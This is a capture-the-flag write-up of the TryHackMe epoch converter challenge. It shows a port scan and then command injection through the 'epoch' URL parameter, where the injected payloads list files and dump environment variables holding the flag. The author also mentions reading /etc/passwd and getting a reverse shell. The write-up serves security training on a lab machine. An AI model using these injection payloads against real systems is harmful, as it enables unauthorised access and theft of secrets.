## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps!
Be honest, you have _always_ wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!

**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox:
```

## IP-Address
```IP-Address
10.201.118.51
```

## RustScan
```bash
$ rustscan -a 10.201.118.51  -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 59
```

## Browser
```browser
http://10.201.118.51/?epoch=ls%3Bls = ls;ls 
date: invalid date '@ls'
go.mod
go.sum
main
main.go
views
```

This is command injection using error or misleading injection
- After this we tried to surf inside the directory but didnt found anything useful
- i found the /etc/passwd which declared the user `challenge` and we also get reverse shell using command injection but without that we got the flag in `$env` variables
```bash
http://10.201.118.51/?epoch=ls%3Benv
date: invalid date '@ls'
HOSTNAME=e7c1352e71ec
PWD=[password omitted]
HOME=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=[flag omitted]
SHLVL=1
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

## Flag
```Flag
[flag omitted]
```